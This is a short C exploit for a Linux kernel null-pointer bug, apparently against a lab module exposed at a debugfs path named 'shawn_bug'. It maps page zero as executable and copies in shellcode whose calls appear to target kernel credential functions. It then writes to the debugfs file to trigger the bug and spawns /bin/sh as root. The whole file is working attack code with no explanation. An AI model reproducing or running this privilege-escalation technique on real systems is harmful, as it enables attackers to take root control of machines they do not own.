#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>

//char payload [] = "\xe9\xea\xbe\xad\x0b" ;
//

/*Disassembly of section .text:

00000000 <.text>:
   0:	31 c0                	xor    %eax,%eax
      2:	e8 e9 56 06 c1       	call   c10656f0 <_end+0xc10646e0>
         7:	e8 e4 54 06 c1       	call   c10654f0 <_end+0xc10644e0>
	    c:	c3                   	ret  */
char payload [] = "\x31\xc0\xe8\xe9\x56\x06\xc1\xe8\xe4\x54\x06\xc1\xc3" ;

int main () {
	mmap (0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1 , 0);
	memcpy (0 , payload, sizeof(payload));
	int fd = open ("/sys/kernel/debug/shawn_bug/exp_me" , O_WRONLY);
	if( fd == -1)
	{
		printf("failed to open()!\n");
		return -1;
	}
	write(fd, "foo", 3);

	system("/bin/sh");
}
